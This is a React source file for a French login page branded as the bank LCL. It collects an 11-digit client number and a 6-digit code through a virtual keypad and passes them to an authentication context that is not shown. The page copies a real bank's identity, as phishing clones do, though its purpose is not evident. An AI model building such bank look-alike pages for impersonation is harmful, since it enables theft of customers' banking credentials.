import React, { useState } from 'react';
import { X, Delete } from 'lucide-react';
import { useAuth } from '../context/AuthContext';

const LCL_BLUE = '#1a237e';
const LCL_YELLOW = '#f5c518';

const LoginPage = ({ navigate }) => {
  const { login } = useAuth();
  const [clientNumber, setClientNumber] = useState('');
  const [code, setCode] = useState('');
  const [showError, setShowError] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showKeyboard, setShowKeyboard] = useState(false);

  const handleNumberClick = (num) => {
    if (code.length < 6) setCode(code + num);
  };

  const handleDelete = () => {
    setCode(code.slice(0, -1));
  };

  const handleLogin = async () => {
    if (!clientNumber || !code) {
      setErrorMessage('Veuillez remplir tous les champs');
      setShowError(true);
      return;
    }
    if (clientNumber.length !== 11) {
      setErrorMessage("Le numéro client doit contenir exactement 11 chiffres");
      setShowError(true);
      return;
    }
    if (code.length !== 6) {
      setErrorMessage('Le code doit contenir exactement 6 chiffres');
      setShowError(true);
      return;
    }

    setIsLoading(true);
    try {
      await login(clientNumber, code);
      navigate('/dashboard');
    } catch (err) {
      setErrorMessage(err.message || 'Identifiant ou mot de passe incorrect');
      setShowError(true);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-start p-4 sm:p-6" style={{ backgroundColor: '#F5F5F5' }}>
      {/* Logo LCL */}
      <div className="mt-8 mb-8 flex items-center gap-3">
        <img
          src="/images/L1.jpeg"
          alt="LCL"
          className="h-14 w-auto object-contain"
          onError={(e) => { e.target.style.display = 'none'; e.target.nextSibling.style.display = 'flex'; }}
        />
        <div
          className="h-14 px-3 rounded-xl items-center justify-center shadow"
          style={{ display: 'none', background: LCL_BLUE, border: `2px solid ${LCL_YELLOW}` }}
        >
          <span style={{ color: LCL_YELLOW, fontWeight: '900', fontSize: '24px', letterSpacing: '2px' }}>LCL</span>
        </div>
      </div>

      {/* Titre */}
      <div className="w-full max-w-md mb-6 px-2">
        <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 leading-tight">
          Bienvenue sur<br />
          <span style={{ color: LCL_BLUE }}>LCL ma banque</span>
        </h1>
      </div>

      {/* Formulaire */}
      <div className="w-full max-w-md px-2">
        <h2 className="text-lg font-semibold text-gray-800 mb-5">Authentification</h2>

        {showError && (
          <div className="bg-red-50 border border-red-200 rounded-2xl p-3 mb-5 flex items-center justify-between">
            <span className="text-red-700 text-sm">{errorMessage}</span>
            <button onClick={() => setShowError(false)}>
              <X className="w-4 h-4 text-red-500" />
            </button>
          </div>
        )}

        {/* N° Client */}
        <div className="mb-5">
          <label className="block text-gray-800 text-sm font-medium mb-2">N° Client</label>
          <input
            type="text"
            value={clientNumber}
            onChange={(e) => {
              const v = e.target.value.replace(/\D/g, '');
              if (v.length <= 11) setClientNumber(v);
            }}
            className="w-full bg-transparent border-b-2 py-2 text-gray-900 text-lg focus:outline-none"
            style={{ borderBottomColor: clientNumber ? LCL_BLUE : '#d1d5db' }}
            disabled={isLoading}
            maxLength={11}
            autoComplete="off"
            placeholder="01234567899"
          />
          <p className="text-xs text-gray-400 mt-1">{clientNumber.length}/11 chiffres</p>
        </div>

        {/* Code */}
        <div className="mb-5">
          <label className="block text-gray-800 text-sm font-medium mb-2">Code</label>
          <input
            type="password"
            value={code}
            onChange={(e) => {
              const v = e.target.value.replace(/\D/g, '');
              if (v.length <= 6) setCode(v);
            }}
            onFocus={() => setShowKeyboard(true)}
            className="w-full bg-transparent border-b-2 py-2 text-gray-900 text-lg focus:outline-none"
            style={{ borderBottomColor: code ? LCL_BLUE : '#d1d5db' }}
            disabled={isLoading}
            maxLength={6}
            autoComplete="new-password"
            readOnly
          />
          <p className="text-xs text-gray-400 mt-1">{code.length}/6 chiffres</p>
        </div>

        {/* Clavier numérique */}
        {showKeyboard && (
          <div className="mb-5 bg-white rounded-2xl p-4 sm:p-6 grid grid-cols-3 gap-3 shadow-sm">
            {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
              <button
                key={num}
                type="button"
                onClick={() => handleNumberClick(num.toString())}
                disabled={isLoading}
                className="bg-transparent hover:bg-gray-100 active:bg-gray-200 text-gray-900 text-2xl font-semibold py-4 rounded-xl transition disabled:opacity-50"
              >
                {num}
              </button>
            ))}
            <div />
            <button
              type="button"
              onClick={() => handleNumberClick('0')}
              disabled={isLoading}
              className="bg-transparent hover:bg-gray-100 text-gray-900 text-2xl font-semibold py-4 rounded-xl transition disabled:opacity-50"
            >
              0
            </button>
            <button
              type="button"
              onClick={handleDelete}
              disabled={isLoading}
              className="bg-transparent hover:bg-gray-100 text-gray-900 py-4 rounded-xl transition flex items-center justify-center disabled:opacity-50"
            >
              <Delete className="w-6 h-6" strokeWidth={2.5} />
            </button>
          </div>
        )}

        {/* Bouton Connexion */}
        <button
          onClick={handleLogin}
          disabled={isLoading}
          className="w-full text-white py-3 sm:py-4 rounded-full text-base sm:text-lg font-semibold transition hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed"
          style={{ backgroundColor: LCL_BLUE }}
        >
          {isLoading ? 'Connexion...' : 'Connexion'}
        </button>

        <div className="mt-5 text-center">
          <p className="text-gray-700 text-sm">
            Pas encore de compte ?{' '}
            <button
              className="font-semibold hover:underline"
              style={{ color: LCL_BLUE }}
              onClick={() => navigate('/inscription')}
            >
              S'inscrire
            </button>
          </p>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;